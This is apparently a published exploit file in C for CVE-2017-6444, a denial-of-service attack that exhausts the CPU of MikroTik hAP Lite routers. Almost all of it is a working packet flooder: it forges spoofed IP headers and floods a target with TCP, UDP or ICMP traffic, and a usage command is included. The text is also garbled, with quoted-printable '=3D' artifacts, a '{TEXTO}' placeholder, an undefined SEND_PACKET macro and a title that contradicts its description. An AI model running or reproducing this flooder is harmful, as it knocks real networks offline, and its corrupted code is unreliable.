/*
#Exploit Title: MikroTik Router Denial Of Service | ARP Table OverFlow
#Exploit Author: Hosein Askari (FarazPajohan)
#Vendor HomePage: https://mikrotik.com/
#Affected Series: Hap Lite
#Version: 6.25
#Tested on: Parrot Security OS
#Date: 04-3-2017
#Category: Network Appliance
#Vulnerable Part: TCP Stack
#Author Mail :hosein.askari@aol.com
#Reference: https://cxsecurity.com/issue/WLB-2017030029
#CVE:2017-6444

#Description:
#The MikroTik Router has not protection mechanism for the case of a fast network connection which allows remote attackers to cause a denial of service (CPU consumption) by #sending many #TCP ACK packets. after the attacker stops the exploit , the CPU usage is 100% and the router should be reboot again for working normally.

#################
#Exploit Command :
# ~~~#exploit.out -T0 -h <MikroTik_ip> -p [23,23]
################
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#ifdef F_PASS
#include <sys/stat.h>
#endif
#include <netinet/in_systm.h>
#include <sys/socket.h>
#include <string.h>
#include <time.h>
#ifndef __USE_BSD
# define __USE_BSD
#endif
#ifndef __FAVOR_BSD
# define __FAVOR_BSD
#endif
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#ifdef LINUX
# define FIX(x) htons(x)
#else
# define FIX(x) (x)
#endif
#define TCP_ACK 1
#define TCP_FIN 2
#define TCP_SYN 4
#define TCP_RST 8
#define UDP_CFF 16
#define ICMP_ECHO_G 32
#define TCP_NOF 64
#define TCP_URG 128
#define TH_NOF 0x0
#define TCP_ATTACK() (a_flags & TCP_ACK ||\
a_flags & TCP_FIN ||\
a_flags & TCP_SYN ||\
a_flags & TCP_RST ||\
a_flags & TCP_NOF ||\
a_flags & TCP_URG )
#define UDP_ATTACK() (a_flags & UDP_CFF)
#define ICMP_ATTACK() (a_flags & ICMP_ECHO_G)
#define CHOOSE_DST_PORT() dst_sp =3D=3D 0 ?\
random () :\
htons(dst_sp + (random() % (dst_ep -dst_sp +1)));
#define CHOOSE_SRC_PORT() src_sp =3D=3D 0 ?\
random () :\
htons(src_sp + (random() % (src_ep -src_sp +1)));
#define KET() if (sendto(rawsock,\
&packet,\
(sizeof packet),\
0,\
(struct sockaddr *)&target,\
sizeof target) < 0) {\
perror("sendto");\
exit(-1);\
}
#define BANNER_CKSUM 54018
u_long lookup(const char *host);
unsigned short in_cksum(unsigned short *addr, int len);
static void inject_iphdr(struct ip *ip, u_char p, u_char len);
char *class2ip(const char *class);
static void send_tcp(u_char th_flags);
static void send_udp(u_char garbage);
static void send_icmp(u_char garbage);
char *get_plain(const char *crypt_file, const char *xor_data_key);
static void usage(const char *argv0);
u_long dstaddr;
u_short dst_sp, dst_ep, src_sp, src_ep;
char *src_class, *dst_class;
int a_flags, rawsock;
struct sockaddr_in target;
const char *banner =3D "Written By C0NSTANTINE";
struct pseudo_hdr {
u_long saddr, daddr;
u_char mbz, ptcl;
u_short tcpl;
};
struct cksum {
struct pseudo_hdr pseudo;
struct tcphdr tcp;
};
struct {
int gv;
int kv;
void (*f)(u_char);
} a_list[] =3D {
{ TCP_ACK, TH_ACK, send_tcp },
{ TCP_FIN, TH_FIN, send_tcp },
{ TCP_SYN, TH_SYN, send_tcp },
{ TCP_RST, TH_RST, send_tcp },
{ TCP_NOF, TH_NOF, send_tcp },
{ TCP_URG, TH_URG, send_tcp },
{ UDP_CFF, 0, send_udp },
{ ICMP_ECHO_G, ICMP_ECHO, send_icmp },
{ 0, 0, (void *)NULL },
};
int
main(int argc, char *argv[])
{
int n, i, on =3D 1;
int b_link;
#ifdef F_PASS
struct stat sb;
#endif
unsigned int until;
a_flags =3D dstaddr =3D i =3D 0;
dst_sp =3D dst_ep =3D src_sp =3D src_ep =3D 0;
until =3D b_link =3D -1;
src_class =3D dst_class =3D NULL;
while ( (n =3D getopt(argc, argv, "T:UINs:h:d:p:q:l:t:")) !=3D -1) {
char *p;
switch (n) {
case 'T':
switch (atoi(optarg)) {
case 0: a_flags |=3D TCP_ACK; break;
case 1: a_flags |=3D TCP_FIN; break;
case 2: a_flags |=3D TCP_RST; break;
case 3: a_flags |=3D TCP_SYN; break;

case 4: a_flags |=3D TCP_URG; break;


}
break;
case 'U':
a_flags |=3D UDP_CFF;
break;
case 'I':
a_flags |=3D ICMP_ECHO_G;
break;
case 'N':
a_flags |=3D TCP_NOF;
break;
case 's':
src_class =3D optarg;
break;
case 'h':
dstaddr =3D lookup(optarg);
break;
case 'd':
dst_class =3D optarg;
i =3D 1;
break;
case 'p':
if ( (p =3D (char *) strchr(optarg, ',')) =3D=3D NULL)
usage(argv[0]);
dst_sp =3D atoi(optarg);
dst_ep =3D atoi(p +1);
break;
case 'q':
if ( (p =3D (char *) strchr(optarg, ',')) =3D=3D NULL)
usage(argv[0]);
src_sp =3D atoi(optarg);
src_ep =3D atoi(p +1);
break;
case 'l':
b_link =3D atoi(optarg);
if (b_link <=3D 0 || b_link > 100)
usage(argv[0]);
break;
case 't':
until =3D time(0) +atoi(optarg);
break;
default:
usage(argv[0]);
break;
}
}
if ( (!dstaddr && !i) ||
(dstaddr && i) ||
(!TCP_ATTACK() && !UDP_ATTACK() && !ICMP_ATTACK()) ||
(src_sp !=3D 0 && src_sp > src_ep) ||
(dst_sp !=3D 0 && dst_sp > dst_ep))
usage(argv[0]);
srandom(time(NULL) ^ getpid());
if ( (rawsock =3D socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
perror("socket");
exit(-1);
}
if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL,
(char *)&on, sizeof(on)) < 0) {
perror("setsockopt");
exit(-1);
}
target.sin_family =3D AF_INET;
for (n =3D 0; ; ) {
if (b_link !=3D -1 && random() % 100 +1 > b_link) {
if (random() % 200 +1 > 199)
usleep(1);
continue;
}
for (i =3D 0; a_list[i].f !=3D NULL; ++i) {
if (a_list[i].gv & a_flags)
a_list[i].f(a_list[i].kv);
}
if (n++ =3D=3D 100) {
if (until !=3D -1 && time(0) >=3D until) break;
n =3D 0;
}
}
exit(0);
}
u_long
lookup(const char *host)
{
struct hostent *hp;

if ( (hp =3D gethostbyname(host)) =3D=3D NULL) {
perror("gethostbyname");
exit(-1);
}
return *(u_long *)hp->h_addr;
}
#define RANDOM() (int) random() % 255 +1
char *
class2ip(const char *class)
{
static char ip[16];
int i, j;

for (i =3D 0, j =3D 0; class[i] !=3D '{TEXTO}'; ++i)
if (class[i] =3D=3D '.')
++j;
switch (j) {
case 0:
sprintf(ip, "%s.%d.%d.%d", class, RANDOM(), RANDOM(), RANDOM());
break;
case 1:
sprintf(ip, "%s.%d.%d", class, RANDOM(), RANDOM());
break;
case 2:
sprintf(ip, "%s.%d", class, RANDOM());
break;
default: strncpy(ip, class, 16);
break;
}
return ip;
}
unsigned short
in_cksum(unsigned short *addr, int len)
{
int nleft =3D len;
int sum =3D 0;
unsigned short *w =3D addr;
unsigned short answer =3D 0;
while (nleft > 1) {
sum +=3D *w++;
nleft -=3D 2;
}
if (nleft =3D=3D 1) {
*(unsigned char *) (&answer) =3D *(unsigned char *)w;
sum +=3D answer;
}
sum =3D (sum >> 16) + (sum & 0xffff);
sum +=3D (sum >> 16);
answer =3D ~sum;
return answer;
}
static void
inject_iphdr(struct ip *ip, u_char p, u_char len)
{
ip->ip_hl =3D 5;
ip->ip_v =3D 4;
ip->ip_p =3D p;
ip->ip_tos =3D 0x08; /* 0x08 */
ip->ip_id =3D random();
ip->ip_len =3D len;
ip->ip_off =3D 0;
ip->ip_ttl =3D 255;
ip->ip_dst.s_addr =3D dst_class !=3D NULL ?
inet_addr(class2ip(dst_class)) :
dstaddr;
ip->ip_src.s_addr =3D src_class !=3D NULL ?
inet_addr(class2ip(src_class)) :
random();
target.sin_addr.s_addr =3D ip->ip_dst.s_addr;
}
static void
send_tcp(u_char th_flags)
{
struct cksum cksum;
struct packet {
struct ip ip;
struct tcphdr tcp;
} packet;
memset(&packet, 0, sizeof packet);
inject_iphdr(&packet.ip, IPPROTO_TCP, FIX(sizeof packet));
packet.ip.ip_sum =3D in_cksum((void *)&packet.ip, 20);
cksum.pseudo.daddr =3D dstaddr;
cksum.pseudo.mbz =3D 0;
cksum.pseudo.ptcl =3D IPPROTO_TCP;
cksum.pseudo.tcpl =3D htons(sizeof(struct tcphdr));
cksum.pseudo.saddr =3D packet.ip.ip_src.s_addr;
packet.tcp.th_flags =3D random();
packet.tcp.th_win =3D random();
packet.tcp.th_seq =3D random();
packet.tcp.th_ack =3D random();
packet.tcp.th_off =3D 5;
packet.tcp.th_urp =3D 0;
packet.tcp.th_sport =3D CHOOSE_SRC_PORT();
packet.tcp.th_dport =3D CHOOSE_DST_PORT();
cksum.tcp =3D packet.tcp;
packet.tcp.th_sum =3D in_cksum((void *)&cksum, sizeof(cksum));
SEND_PACKET();
}
static void
send_udp(u_char garbage)
{
struct packet {
struct ip ip;
struct udphdr udp;
} packet;
memset(&packet, 0, sizeof packet);
inject_iphdr(&packet.ip, IPPROTO_UDP, FIX(sizeof packet));
packet.ip.ip_sum =3D in_cksum((void *)&packet.ip, 20);
packet.udp.uh_sport =3D CHOOSE_SRC_PORT();
packet.udp.uh_dport =3D CHOOSE_DST_PORT();
packet.udp.uh_ulen =3D htons(sizeof packet.udp);
packet.udp.uh_sum =3D 0;
SEND_PACKET();
}
static void
send_icmp(u_char gargabe)
{
struct packet {
struct ip ip;
struct icmp icmp;
} packet;
memset(&packet, 0, sizeof packet);
inject_iphdr(&packet.ip, IPPROTO_ICMP, FIX(sizeof packet));
packet.ip.ip_sum =3D in_cksum((void *)&packet.ip, 20);
packet.icmp.icmp_type =3D ICMP_ECHO;
packet.icmp.icmp_code =3D 0;
packet.icmp.icmp_cksum =3D htons( ~(ICMP_ECHO << 8));
for(int pp=3D0;pp<=3D1000;pp++)
{SEND_PACKET();
pp++;
}
}
static void
usage(const char *argv0)
{
printf("%s \n", banner);
printf(" -U UDP attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\=
n");
printf(" -I ICMP attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m=
\n");
printf(" -N Bogus attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0=
m\n");
printf(" -T TCP attack \e[1;37m[\e[0m0:ACK, 1:FIN, 2:RST, 3:SYN, 4:URG\e[1;=
37m]\e[0m\n");
printf(" -h destination host/ip \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;3=
7m)\e[0m\n");
printf(" -d destination class \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[=
0m\n");
printf(" -s source class/ip \e[1;37m(\e[m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\=
n");
printf(" -p destination port range [start,end] \e[1;37m(\e[0m\e[0;31mrandom=
\e[0m\e[1;37m)\e[0m\n");
printf(" -q source port range [start,end] \e[1;37m(\e[0m\e[0;31mrandom\e[0m=
\e[1;37m)\e[0m\n");
printf(" -l pps limiter \e[1;37m(\e[0m\e[0;31mno limit\e[0m\e[1;37m)\e[0m\n=
");
printf(" -t timeout \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n")=
;
printf("\e[1musage\e[0m: %s [-T0 -T1 -T2 -T3 -T4 -U -I -h -p -t]\n", argv0)=
;
exit(-1);
}